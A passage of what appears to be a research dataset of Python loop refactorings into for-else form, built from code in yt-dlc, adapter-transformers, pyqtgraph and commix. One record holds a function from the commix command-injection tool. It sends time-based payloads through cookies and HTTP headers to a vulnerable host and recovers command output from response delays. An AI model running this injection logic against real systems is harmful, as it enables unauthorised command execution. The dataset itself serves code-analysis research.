    feed_id = self._search_regex('defaultFeedId\\s*:\\s*""([^""]+)""', feed_script, 'default feed id', default=None)
    if feed_id is not None:
        break
if feed_id is None:
    raise ExtractorError('Unable to find feed id')","for script in reversed(scripts):
    feed_script = self._download_webpage(self._proto_relative_url(script, 'http:'), video_id, 'Downloading feed script')
    feed_id = self._search_regex('defaultFeedId\\s*:\\s*""([^""]+)""', feed_script, 'default feed id', default=None)
    if feed_id is not None:
        break
else:
    raise ExtractorError('Unable to find feed id')","for script in reversed(scripts):
    feed_script = self._download_webpage(self._proto_relative_url(script, 'http:'), video_id, 'Downloading feed script')
    feed_id = self._search_regex('defaultFeedId\\s*:\\s*""([^""]+)""', feed_script, 'default feed id', default=None)
    if feed_id is not None:
        break
else:
    raise ExtractorError('Unable to find feed id')",1,"for script in reversed(scripts):
    feed_script = self._download_webpage(self._proto_relative_url(script, 'http:'), video_id, 'Downloading feed script')
    feed_id = self._search_regex('defaultFeedId\\s*:\\s*""([^""]+)""', feed_script, 'default feed id', default=None)
    if feed_id is not None:
        break
if feed_id is None:
    raise ExtractorError('Unable to find feed id')","break statement is executed:None
break statement is not executed:zejun1"
commix,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/commix/src/core/injections/blind/techniques/time_based/tb_injector.py,https://github.com/commixproject/commix/tree/master/src/core/injections/blind/techniques/time_based/tb_injector.py,,false_positive_check$355,"def false_positive_check(separator, TAG, cmd, whitespace, prefix, suffix, timesec, http_request_method, url, vuln_parameter, randvcalc, alter_shell, how_long, url_time_response, false_positive_warning):

  if settings.TARGET_OS == ""win"":
    previous_cmd = cmd
    if alter_shell:
      cmd = settings.WIN_PYTHON_INTERPRETER + "" -c \""import os; print len(os.popen('cmd /c "" + cmd + ""').read().strip())\""""
    else: 
      cmd = ""powershell.exe -InputFormat none write-host ([string](cmd /c "" + cmd + "")).trim().length""

  found_chars = False
  checks.check_for_false_positive_result(false_positive_warning)

  # Varying the sleep time.
  if false_positive_warning:
    timesec = timesec + random.randint(3, 5)

  # Checking the output length of the used payload.
  if settings.VERBOSITY_LEVEL == 0: 
    sys.stdout.write(""."")
  for output_length in range(1, 3):
    if settings.VERBOSITY_LEVEL == 0: 
      sys.stdout.write(""."")
    # Execute shell commands on vulnerable host.
    if alter_shell:
      payload = tb_payloads.cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_request_method)
    else:
      payload = tb_payloads.cmd_execution(separator, cmd, output_length, timesec, http_request_method)
    
    # Fix prefixes / suffixes
    payload = parameters.prefixes(payload, prefix)
    payload = parameters.suffixes(payload, suffix)

    # Whitespace fixation
    payload = payload.replace(settings.SINGLE_WHITESPACE, whitespace)

    # Perform payload modification
    payload = checks.perform_payload_modification(payload)

    # Check if defined ""--verbose"" option.
    if settings.VERBOSITY_LEVEL != 0:
      payload_msg = payload.replace(""\n"", ""\\n"") 
      print(settings.print_payload(payload_msg))

    # Check if defined cookie with ""INJECT_HERE"" tag
    if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
      how_long = cookie_injection_test(url, vuln_parameter, payload)

    # Check if defined user-agent with ""INJECT_HERE"" tag
    elif menu.options.agent and settings.INJECT_TAG in menu.options.agent:
      how_long = user_agent_injection_test(url, vuln_parameter, payload)

    # Check if defined referer with ""INJECT_HERE"" tag
    elif menu.options.referer and settings.INJECT_TAG in menu.options.referer:
      how_long = referer_injection_test(url, vuln_parameter, payload)

    # Check if defined host with ""INJECT_HERE"" tag
    elif menu.options.host and settings.INJECT_TAG in menu.options.host:
      how_long = host_injection_test(url, vuln_parameter, payload)

    # Check if defined custom header with ""INJECT_HERE"" tag
    elif settings.CUSTOM_HEADER_INJECTION:
      how_long = custom_header_injection_test(url, vuln_parameter, payload)

    else:  
      how_long = examine_requests(payload, vuln_parameter, http_request_method, url, timesec, url_time_response)

    if (how_long >= settings.FOUND_HOW_LONG) and (how_long - timesec >= settings.FOUND_DIFF):
      found_chars = True
      break

  if found_chars == True :
    if settings.TARGET_OS == ""win"":
      cmd = previous_cmd
    num_of_chars = output_length + 1
    check_start = 0
    check_end = 0
    check_start = time.time()
    
    output = []
    percent = 0
    sys.stdout.flush()

    is_valid = False
    for num_of_chars in range(1, int(num_of_chars)):
      for ascii_char in range(1, 20):
        if settings.VERBOSITY_LEVEL == 0:
          sys.stdout.write(""."")
        if alter_shell:
          # Get the execution output, of shell execution.
          payload = tb_payloads.fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method)
        else:
          # Get the execution output, of shell execution.
          payload = tb_payloads.fp_result(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method)
          
        # Fix prefixes / suffixes
        payload = parameters.prefixes(payload, prefix)
        payload = parameters.suffixes(payload, suffix)

        # Whitespace fixation
        payload = payload.replace(settings.SINGLE_WHITESPACE, whitespace)

        # Perform payload modification
        payload = checks.perform_payload_modification(payload)

        # Check if defined ""--verbose"" option.
        if settings.VERBOSITY_LEVEL != 0:
          payload_msg = payload.replace(""\n"", ""\\n"") 
          print(settings.print_payload(payload_msg))

        # Check if defined cookie with ""INJECT_HERE"" tag
        if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
          how_long = cookie_injection_test(url, vuln_parameter, payload)

        # Check if defined user-agent with ""INJECT_HERE"" tag
        elif menu.options.agent and settings.INJECT_TAG in menu.options.agent:
          how_long = user_agent_injection_test(url, vuln_parameter, payload)

        # Check if defined referer with ""INJECT_HERE"" tag
        elif menu.options.referer and settings.INJECT_TAG in menu.options.referer:
          how_long = referer_injection_test(url, vuln_parameter, payload)

        # Check if defined host with ""INJECT_HERE"" tag
        elif menu.options.host and settings.INJECT_TAG in menu.options.host:
          how_long = host_injection_test(url, vuln_parameter, payload)

        # Check if defined custom header with ""INJECT_HERE"" tag
        elif settings.CUSTOM_HEADER_INJECTION:
          how_long = custom_header_injection_test(url, vuln_parameter, payload)

        else:    
          how_long = examine_requests(payload, vuln_parameter, http_request_method, url, timesec, url_time_response)

        if (how_long >= settings.FOUND_HOW_LONG) and (how_long - timesec >= settings.FOUND_DIFF):
          output.append(ascii_char)
          is_valid = True
          break
          
      if is_valid:
          break

    check_end  = time.time()
    check_how_long = int(check_end - check_start)
    output = """".join(str(p) for p in output)

    if str(output) == str(randvcalc):
      if settings.VERBOSITY_LEVEL == 0: 
        sys.stdout.write("" (done)"")
      return how_long, output

  else:
    checks.unexploitable_point()","for output_length in range(1, 3):
    if settings.VERBOSITY_LEVEL == 0:
        sys.stdout.write('.')
    if alter_shell:
        payload = tb_payloads.cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_request_method)
    else:
        payload = tb_payloads.cmd_execution(separator, cmd, output_length, timesec, http_request_method)
    payload = parameters.prefixes(payload, prefix)
    payload = parameters.suffixes(payload, suffix)
    payload = payload.replace(settings.SINGLE_WHITESPACE, whitespace)
    payload = checks.perform_payload_modification(payload)
    if settings.VERBOSITY_LEVEL != 0:
        payload_msg = payload.replace('\n', '\\n')
        print(settings.print_payload(payload_msg))
    if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
        how_long = cookie_injection_test(url, vuln_parameter, payload)
    elif menu.options.agent and settings.INJECT_TAG in menu.options.agent:
        how_long = user_agent_injection_test(url, vuln_parameter, payload)
    elif menu.options.referer and settings.INJECT_TAG in menu.options.referer:
        how_long = referer_injection_test(url, vuln_parameter, payload)
    elif menu.options.host and settings.INJECT_TAG in menu.options.host:
        how_long = host_injection_test(url, vuln_parameter, payload)
    elif settings.CUSTOM_HEADER_INJECTION:
        how_long = custom_header_injection_test(url, vuln_parameter, payload)
    else:
        how_long = examine_requests(payload, vuln_parameter, http_request_method, url, timesec, url_time_response)
    if how_long >= settings.FOUND_HOW_LONG and how_long - timesec >= settings.FOUND_DIFF:
        found_chars = True
        break
if found_chars == True:
    if settings.TARGET_OS == 'win':
        cmd = previous_cmd
    num_of_chars = output_length + 1
    check_start = 0
    check_end = 0
    check_start = time.time()
    output = []
    percent = 0
    sys.stdout.flush()
    is_valid = False
    for num_of_chars in range(1, int(num_of_chars)):
        for ascii_char in range(1, 20):
            if settings.VERBOSITY_LEVEL == 0:
                sys.stdout.write('.')
            if alter_shell:
                payload = tb_payloads.fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method)
            else:
                payload = tb_payloads.fp_result(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method)
            payload = parameters.prefixes(payload, prefix)
            payload = parameters.suffixes(payload, suffix)
            payload = payload.replace(settings.SINGLE_WHITESPACE, whitespace)
            payload = checks.perform_payload_modification(payload)
            if settings.VERBOSITY_LEVEL != 0:
                payload_msg = payload.replace('\n', '\\n')
                print(settings.print_payload(payload_msg))
            if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
                how_long = cookie_injection_test(url, vuln_parameter, payload)
            elif menu.options.agent and settings.INJECT_TAG in menu.options.agent:
                how_long = user_agent_injection_test(url, vuln_parameter, payload)
            elif menu.options.referer and settings.INJECT_TAG in menu.options.referer:
                how_long = referer_injection_test(url, vuln_parameter, payload)
            elif menu.options.host and settings.INJECT_TAG in menu.options.host:
                how_long = host_injection_test(url, vuln_parameter, payload)
            elif settings.CUSTOM_HEADER_INJECTION:
                how_long = custom_header_injection_test(url, vuln_parameter, payload)
            else:
                how_long = examine_requests(payload, vuln_parameter, http_request_method, url, timesec, url_time_response)
            if how_long >= settings.FOUND_HOW_LONG and how_long - timesec >= settings.FOUND_DIFF:
                output.append(ascii_char)
                is_valid = True
                break
        if is_valid:
            break
    check_end = time.time()
    check_how_long = int(check_end - check_start)
    output = ''.join((str(p) for p in output))
    if str(output) == str(randvcalc):
        if settings.VERBOSITY_LEVEL == 0:
            sys.stdout.write(' (done)')
        return (how_long, output)
else:
    checks.unexploitable_point()","for output_length in range(1, 3):
    if settings.VERBOSITY_LEVEL == 0:
        sys.stdout.write('.')
    if alter_shell:
        payload = tb_payloads.cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_request_method)
    else:
        payload = tb_payloads.cmd_execution(separator, cmd, output_length, timesec, http_request_method)
    payload = parameters.prefixes(payload, prefix)
    payload = parameters.suffixes(payload, suffix)
    payload = payload.replace(settings.SINGLE_WHITESPACE, whitespace)
    payload = checks.perform_payload_modification(payload)
    if settings.VERBOSITY_LEVEL != 0:
        payload_msg = payload.replace('\n', '\\n')
        print(settings.print_payload(payload_msg))
    if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
        how_long = cookie_injection_test(url, vuln_parameter, payload)
    elif menu.options.agent and settings.INJECT_TAG in menu.options.agent:
        how_long = user_agent_injection_test(url, vuln_parameter, payload)
    elif menu.options.referer and settings.INJECT_TAG in menu.options.referer:
        how_long = referer_injection_test(url, vuln_parameter, payload)
    elif menu.options.host and settings.INJECT_TAG in menu.options.host:
        how_long = host_injection_test(url, vuln_parameter, payload)
    elif settings.CUSTOM_HEADER_INJECTION:
        how_long = custom_header_injection_test(url, vuln_parameter, payload)
    else:
        how_long = examine_requests(payload, vuln_parameter, http_request_method, url, timesec, url_time_response)
    if how_long >= settings.FOUND_HOW_LONG and how_long - timesec >= settings.FOUND_DIFF:
        if settings.TARGET_OS == 'win':
            cmd = previous_cmd
        num_of_chars = output_length + 1
        check_start = 0
        check_end = 0
        check_start = time.time()
        output = []
        percent = 0
        sys.stdout.flush()
        is_valid = False
        for num_of_chars in range(1, int(num_of_chars)):
            for ascii_char in range(1, 20):
                if settings.VERBOSITY_LEVEL == 0:
                    sys.stdout.write('.')
                if alter_shell:
                    payload = tb_payloads.fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method)
                else:
                    payload = tb_payloads.fp_result(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method)
                payload = parameters.prefixes(payload, prefix)
                payload = parameters.suffixes(payload, suffix)
                payload = payload.replace(settings.SINGLE_WHITESPACE, whitespace)
                payload = checks.perform_payload_modification(payload)
                if settings.VERBOSITY_LEVEL != 0:
                    payload_msg = payload.replace('\n', '\\n')
                    print(settings.print_payload(payload_msg))
                if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
                    how_long = cookie_injection_test(url, vuln_parameter, payload)
                elif menu.options.agent and settings.INJECT_TAG in menu.options.agent:
                    how_long = user_agent_injection_test(url, vuln_parameter, payload)
                elif menu.options.referer and settings.INJECT_TAG in menu.options.referer:
                    how_long = referer_injection_test(url, vuln_parameter, payload)
                elif menu.options.host and settings.INJECT_TAG in menu.options.host:
                    how_long = host_injection_test(url, vuln_parameter, payload)
                elif settings.CUSTOM_HEADER_INJECTION:
                    how_long = custom_header_injection_test(url, vuln_parameter, payload)
                else:
                    how_long = examine_requests(payload, vuln_parameter, http_request_method, url, timesec, url_time_response)
                if how_long >= settings.FOUND_HOW_LONG and how_long - timesec >= settings.FOUND_DIFF:
                    output.append(ascii_char)
                    is_valid = True
                    break
            if is_valid:
                break
        check_end = time.time()
        check_how_long = int(check_end - check_start)
        output = ''.join((str(p) for p in output))
        if str(output) == str(randvcalc):
            if settings.VERBOSITY_LEVEL == 0:
                sys.stdout.write(' (done)')
            return (how_long, output)
        break
else:
    checks.unexploitable_point()","for output_length in range(1, 3):
    if settings.VERBOSITY_LEVEL == 0:
        sys.stdout.write('.')
    if alter_shell:
        payload = tb_payloads.cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_request_method)
    else:
        payload = tb_payloads.cmd_execution(separator, cmd, output_length, timesec, http_request_method)
    payload = parameters.prefixes(payload, prefix)
    payload = parameters.suffixes(payload, suffix)
    payload = payload.replace(settings.SINGLE_WHITESPACE, whitespace)
    payload = checks.perform_payload_modification(payload)
    if settings.VERBOSITY_LEVEL != 0:
        payload_msg = payload.replace('\n', '\\n')
        print(settings.print_payload(payload_msg))
    if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
        how_long = cookie_injection_test(url, vuln_parameter, payload)
    elif menu.options.agent and settings.INJECT_TAG in menu.options.agent:
        how_long = user_agent_injection_test(url, vuln_parameter, payload)
    elif menu.options.referer and settings.INJECT_TAG in menu.options.referer:
        how_long = referer_injection_test(url, vuln_parameter, payload)
    elif menu.options.host and settings.INJECT_TAG in menu.options.host:
        how_long = host_injection_test(url, vuln_parameter, payload)
    elif settings.CUSTOM_HEADER_INJECTION:
        how_long = custom_header_injection_test(url, vuln_parameter, payload)
    else:
        how_long = examine_requests(payload, vuln_parameter, http_request_method, url, timesec, url_time_response)
    if how_long >= settings.FOUND_HOW_LONG and how_long - timesec >= settings.FOUND_DIFF:
        if settings.TARGET_OS == 'win':
            cmd = previous_cmd
        num_of_chars = output_length + 1
        check_start = 0
        check_end = 0
        check_start = time.time()
        output = []
        percent = 0
        sys.stdout.flush()
        is_valid = False
        for num_of_chars in range(1, int(num_of_chars)):
            for ascii_char in range(1, 20):
                if settings.VERBOSITY_LEVEL == 0:
                    sys.stdout.write('.')
                if alter_shell:
                    payload = tb_payloads.fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method)
                else:
                    payload = tb_payloads.fp_result(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method)
                payload = parameters.prefixes(payload, prefix)
                payload = parameters.suffixes(payload, suffix)
                payload = payload.replace(settings.SINGLE_WHITESPACE, whitespace)
                payload = checks.perform_payload_modification(payload)
                if settings.VERBOSITY_LEVEL != 0:
                    payload_msg = payload.replace('\n', '\\n')
                    print(settings.print_payload(payload_msg))
                if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
                    how_long = cookie_injection_test(url, vuln_parameter, payload)
                elif menu.options.agent and settings.INJECT_TAG in menu.options.agent:
                    how_long = user_agent_injection_test(url, vuln_parameter, payload)
                elif menu.options.referer and settings.INJECT_TAG in menu.options.referer:
                    how_long = referer_injection_test(url, vuln_parameter, payload)
                elif menu.options.host and settings.INJECT_TAG in menu.options.host:
                    how_long = host_injection_test(url, vuln_parameter, payload)
                elif settings.CUSTOM_HEADER_INJECTION:
                    how_long = custom_header_injection_test(url, vuln_parameter, payload)
                else:
                    how_long = examine_requests(payload, vuln_parameter, http_request_method, url, timesec, url_time_response)
                if how_long >= settings.FOUND_HOW_LONG and how_long - timesec >= settings.FOUND_DIFF:
                    output.append(ascii_char)
                    is_valid = True
                    break
            if is_valid:
                break
        check_end = time.time()
        check_how_long = int(check_end - check_start)
        output = ''.join((str(p) for p in output))
        if str(output) == str(randvcalc):
            if settings.VERBOSITY_LEVEL == 0:
                sys.stdout.write(' (done)')
            return (how_long, output)
        break
else:
    checks.unexploitable_point()",1,"for output_length in range(1, 3):
    if settings.VERBOSITY_LEVEL == 0:
        sys.stdout.write('.')
    if alter_shell:
        payload = tb_payloads.cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_request_method)
    else:
        payload = tb_payloads.cmd_execution(separator, cmd, output_length, timesec, http_request_method)
    payload = parameters.prefixes(payload, prefix)
    payload = parameters.suffixes(payload, suffix)
    payload = payload.replace(settings.SINGLE_WHITESPACE, whitespace)
    payload = checks.perform_payload_modification(payload)
    if settings.VERBOSITY_LEVEL != 0:
        payload_msg = payload.replace('\n', '\\n')
        print(settings.print_payload(payload_msg))
    if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
        how_long = cookie_injection_test(url, vuln_parameter, payload)
    elif menu.options.agent and settings.INJECT_TAG in menu.options.agent:
        how_long = user_agent_injection_test(url, vuln_parameter, payload)
    elif menu.options.referer and settings.INJECT_TAG in menu.options.referer:
        how_long = referer_injection_test(url, vuln_parameter, payload)
    elif menu.options.host and settings.INJECT_TAG in menu.options.host:
        how_long = host_injection_test(url, vuln_parameter, payload)
    elif settings.CUSTOM_HEADER_INJECTION:
        how_long = custom_header_injection_test(url, vuln_parameter, payload)
    else:
        how_long = examine_requests(payload, vuln_parameter, http_request_method, url, timesec, url_time_response)
    if how_long >= settings.FOUND_HOW_LONG and how_long - timesec >= settings.FOUND_DIFF:
        found_chars = True
        break
if found_chars == True:
    if settings.TARGET_OS == 'win':
        cmd = previous_cmd
    num_of_chars = output_length + 1
    check_start = 0
    check_end = 0
    check_start = time.time()
    output = []
    percent = 0
    sys.stdout.flush()
    is_valid = False
    for num_of_chars in range(1, int(num_of_chars)):
        for ascii_char in range(1, 20):
            if settings.VERBOSITY_LEVEL == 0:
                sys.stdout.write('.')
            if alter_shell:
                payload = tb_payloads.fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method)
            else:
                payload = tb_payloads.fp_result(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method)
            payload = parameters.prefixes(payload, prefix)
            payload = parameters.suffixes(payload, suffix)
            payload = payload.replace(settings.SINGLE_WHITESPACE, whitespace)
            payload = checks.perform_payload_modification(payload)
            if settings.VERBOSITY_LEVEL != 0:
                payload_msg = payload.replace('\n', '\\n')
                print(settings.print_payload(payload_msg))
            if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
                how_long = cookie_injection_test(url, vuln_parameter, payload)
            elif menu.options.agent and settings.INJECT_TAG in menu.options.agent:
                how_long = user_agent_injection_test(url, vuln_parameter, payload)
            elif menu.options.referer and settings.INJECT_TAG in menu.options.referer:
                how_long = referer_injection_test(url, vuln_parameter, payload)
            elif menu.options.host and settings.INJECT_TAG in menu.options.host:
                how_long = host_injection_test(url, vuln_parameter, payload)
            elif settings.CUSTOM_HEADER_INJECTION:
                how_long = custom_header_injection_test(url, vuln_parameter, payload)
            else:
                how_long = examine_requests(payload, vuln_parameter, http_request_method, url, timesec, url_time_response)
            if how_long >= settings.FOUND_HOW_LONG and how_long - timesec >= settings.FOUND_DIFF:
                output.append(ascii_char)
                is_valid = True
                break
        if is_valid:
            break
    check_end = time.time()
    check_how_long = int(check_end - check_start)
    output = ''.join((str(p) for p in output))
    if str(output) == str(randvcalc):
        if settings.VERBOSITY_LEVEL == 0:
            sys.stdout.write(' (done)')
        return (how_long, output)
else:
    checks.unexploitable_point()","break statement is executed:zejun1
break statement is not executed:None"
adapter-transformers,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/adapter-transformers/src/transformers/models/electra/tokenization_electra.py,https://github.com/Adapter-Hub/adapter-transformers/tree/master/src/transformers/models/electra/tokenization_electra.py,WordpieceTokenizer,tokenize$486,"def tokenize(self, text):
        """"""
        Tokenizes a piece of text into its word pieces. This uses a greedy longest-match-first algorithm to perform
        tokenization using the given vocabulary.

        For example, `input = ""unaffable""` wil return as output `[""un"", ""##aff"", ""##able""]`.

        Args:
            text: A single token or whitespace separated tokens. This should have
                already been passed through *BasicTokenizer*.

        Returns:
            A list of wordpiece tokens.
        """"""

        output_tokens = []
        for token in whitespace_tokenize(text):
            chars = list(token)
            if len(chars) > self.max_input_chars_per_word:
                output_tokens.append(self.unk_token)
                continue

            is_bad = False
            start = 0
            sub_tokens = []
            while start < len(chars):
                end = len(chars)
                cur_substr = None
                while start < end:
                    substr = """".join(chars[start:end])
                    if start > 0:
                        substr = ""##"" + substr
                    if substr in self.vocab:
                        cur_substr = substr
                        break
                    end -= 1
                if cur_substr is None:
                    is_bad = True
                    break
                sub_tokens.append(cur_substr)
                start = end

            if is_bad:
                output_tokens.append(self.unk_token)
            else:
                output_tokens.extend(sub_tokens)
        return output_tokens","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        is_bad = True
        break
    sub_tokens.append(cur_substr)
    start = end
if is_bad:
    output_tokens.append(self.unk_token)
else:
    output_tokens.extend(sub_tokens)","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        output_tokens.append(self.unk_token)
        break
    sub_tokens.append(cur_substr)
    start = end
else:
    output_tokens.extend(sub_tokens)","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        output_tokens.append(self.unk_token)
        break
    sub_tokens.append(cur_substr)
    start = end
else:
    output_tokens.extend(sub_tokens)",1,"while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        is_bad = True
        break
    sub_tokens.append(cur_substr)
    start = end
if is_bad:
    output_tokens.append(self.unk_token)
else:
    output_tokens.extend(sub_tokens)","break statement is executed:zejun1
break statement is not executed:None"
adapter-transformers,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/adapter-transformers/src/transformers/models/electra/tokenization_electra.py,https://github.com/Adapter-Hub/adapter-transformers/tree/master/src/transformers/models/electra/tokenization_electra.py,WordpieceTokenizer,tokenize$486,"def tokenize(self, text):
        """"""
        Tokenizes a piece of text into its word pieces. This uses a greedy longest-match-first algorithm to perform
        tokenization using the given vocabulary.

        For example, `input = ""unaffable""` wil return as output `[""un"", ""##aff"", ""##able""]`.

        Args:
            text: A single token or whitespace separated tokens. This should have
                already been passed through *BasicTokenizer*.

        Returns:
            A list of wordpiece tokens.
        """"""

        output_tokens = []
        for token in whitespace_tokenize(text):
            chars = list(token)
            if len(chars) > self.max_input_chars_per_word:
                output_tokens.append(self.unk_token)
                continue

            is_bad = False
            start = 0
            sub_tokens = []
            while start < len(chars):
                end = len(chars)
                cur_substr = None
                while start < end:
                    substr = """".join(chars[start:end])
                    if start > 0:
                        substr = ""##"" + substr
                    if substr in self.vocab:
                        cur_substr = substr
                        break
                    end -= 1
                if cur_substr is None:
                    is_bad = True
                    break
                sub_tokens.append(cur_substr)
                start = end

            if is_bad:
                output_tokens.append(self.unk_token)
            else:
                output_tokens.extend(sub_tokens)
        return output_tokens","while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
if cur_substr is None:
    is_bad = True
    break","while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
else:
    is_bad = True
    break",Cannot refactor,-1,"while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
if cur_substr is None:
    is_bad = True
    break","break statement is executed:None
break statement is not executed:zejun1"
pyqtgraph,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/pyqtgraph/pyqtgraph/widgets/ProgressDialog.py,https://github.com/pyqtgraph/pyqtgraph/tree/master/pyqtgraph/widgets/ProgressDialog.py,ProgressDialog,_addSubDialog$117,"def _addSubDialog(self, dlg):
        # insert widgets from another dialog into this one.
        
        # set a new layout and arrange children into it (if needed).
        self._prepareNesting()
        
        bar, btn = dlg._extractWidgets()
        
        # where should we insert this widget? Find the first slot with a 
        # ""removed"" widget (that was left as a placeholder)
        inserted = False
        for i,bar2 in enumerate(self._subBars):
            if bar2.hidden:
                self._subBars.pop(i)
                bar2.hide()
                bar2.setParent(None)
                self._subBars.insert(i, bar)
                inserted = True
                break
        if not inserted:
            self._subBars.append(bar)
            
        # reset the layout
        while self.nestedLayout.count() > 0:
            self.nestedLayout.takeAt(0)
        for b in self._subBars:
            self.nestedLayout.addWidget(b)","for (i, bar2) in enumerate(self._subBars):
    if bar2.hidden:
        self._subBars.pop(i)
        bar2.hide()
        bar2.setParent(None)
        self._subBars.insert(i, bar)
        inserted = True
        break
if not inserted:
    self._subBars.append(bar)","for (i, bar2) in enumerate(self._subBars):
    if bar2.hidden:
        self._subBars.pop(i)
        bar2.hide()
        bar2.setParent(None)
        self._subBars.insert(i, bar)
        break
else:
    self._subBars.append(bar)","for (i, bar2) in enumerate(self._subBars):
    if bar2.hidden:
        self._subBars.pop(i)
        bar2.hide()
        bar2.setParent(None)
        self._subBars.insert(i, bar)
        break
else:
    self._subBars.append(bar)",1,"for (i, bar2) in enumerate(self._subBars):
    if bar2.hidden:
        self._subBars.pop(i)
        bar2.hide()
        bar2.setParent(None)
        self._subBars.insert(i, bar)
        inserted = True
        break
if not inserted:
    self._subBars.append(bar)","break statement is executed:None
break statement is not executed:zejun1"
yt-dlc,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/yt-dlc/youtube_dlc/extractor/theplatform.py,https://github.com/blackjack4494/yt-dlc/tree/master/youtube_dlc/extractor/theplatform.py,ThePlatformIE,_real_extract$235,"def _real_extract(self, url):
        url, smuggled_data = unsmuggle_url(url, {})

        mobj = re.match(self._VALID_URL, url)
        provider_id = mobj.group('provider_id')
        video_id = mobj.group('id')

        if not provider_id:
            provider_id = 'dJ5BDC'

        path = provider_id + '/'
        if mobj.group('media'):
            path += mobj.group('media')
        path += video_id

        qs_dict = compat_parse_qs(compat_urllib_parse_urlparse(url).query)
        if 'guid' in qs_dict:
            webpage = self._download_webpage(url, video_id)
            scripts = re.findall(r'<script[^>]+src=""([^""]+)""', webpage)
            feed_id = None
            # feed id usually locates in the last script.
            # Seems there's no pattern for the interested script filename, so
            # I try one by one
            for script in reversed(scripts):
                feed_script = self._download_webpage(
                    self._proto_relative_url(script, 'http:'),
                    video_id, 'Downloading feed script')
                feed_id = self._search_regex(
                    r'defaultFeedId\s*:\s*""([^""]+)""', feed_script,
                    'default feed id', default=None)
                if feed_id is not None:
                    break
            if feed_id is None:
                raise ExtractorError('Unable to find feed id')
            return self.url_result('http://feed.theplatform.com/f/%s/%s?byGuid=%s' % (
                provider_id, feed_id, qs_dict['guid'][0]))

        if smuggled_data.get('force_smil_url', False):
            smil_url = url
        # Explicitly specified SMIL (see https://github.com/ytdl-org/youtube-dl/issues/7385)
        elif '/guid/' in url:
            headers = {}
            source_url = smuggled_data.get('source_url')
            if source_url:
                headers['Referer'] = source_url
            request = sanitized_Request(url, headers=headers)
            webpage = self._download_webpage(request, video_id)
            smil_url = self._search_regex(
                r'<link[^>]+href=([""\'])(?P<url>.+?)\1[^>]+type=[""\']application/smil\+xml',
                webpage, 'smil url', group='url')
            path = self._search_regex(
                r'link\.theplatform\.com/s/((?:[^/?#&]+/)+[^/?#&]+)', smil_url, 'path')
            smil_url += '?' if '?' not in smil_url else '&' + 'formats=m3u,mpeg4'
        elif mobj.group('config'):
            config_url = url + '&form=json'
            config_url = config_url.replace('swf/', 'config/')
            config_url = config_url.replace('onsite/', 'onsite/config/')
            config = self._download_json(config_url, video_id, 'Downloading config')
            if 'releaseUrl' in config:
                release_url = config['releaseUrl']
            else:
                release_url = 'http://link.theplatform.com/s/%s?mbr=true' % path
            smil_url = release_url + '&formats=MPEG4&manifest=f4m'
        else:
            smil_url = 'http://link.theplatform.com/s/%s?mbr=true' % path

        sig = smuggled_data.get('sig')
        if sig:
            smil_url = self._sign_url(smil_url, sig['key'], sig['secret'])

        formats, subtitles = self._extract_theplatform_smil(smil_url, video_id)
        self._sort_formats(formats)

        ret = self._extract_theplatform_metadata(path, video_id)
        combined_subtitles = self._merge_subtitles(ret.get('subtitles', {}), subtitles)
        ret.update({
            'id': video_id,
            'formats': formats,
            'subtitles': combined_subtitles,
        })

        return ret","for script in reversed(scripts):
    feed_script = self._download_webpage(self._proto_relative_url(script, 'http:'), video_id, 'Downloading feed script')
    feed_id = self._search_regex('defaultFeedId\\s*:\\s*""([^""]+)""', feed_script, 'default feed id', default=None)
    if feed_id is not None:
        break
if feed_id is None:
    raise ExtractorError('Unable to find feed id')","for script in reversed(scripts):
    feed_script = self._download_webpage(self._proto_relative_url(script, 'http:'), video_id, 'Downloading feed script')
